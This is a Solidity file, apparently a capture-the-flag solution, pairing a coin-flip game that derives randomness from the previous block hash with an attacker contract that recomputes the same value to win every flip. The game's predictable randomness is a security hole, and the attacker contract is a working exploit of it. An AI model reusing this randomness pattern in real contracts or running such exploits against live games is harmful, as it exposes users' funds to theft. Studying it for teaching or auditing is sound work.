// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker{

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private immutable target;

    constructor(address _target){
        target = CoinFlip(_target);
    }

    function flip() public {
        bool guess = _guess();
        require(target.flip(guess), "guess not correct");
    }

    function _guess() public view returns (bool){
        uint blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}


contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } 
    
    else {
      consecutiveWins = 0;
      return false;
    }
  }
}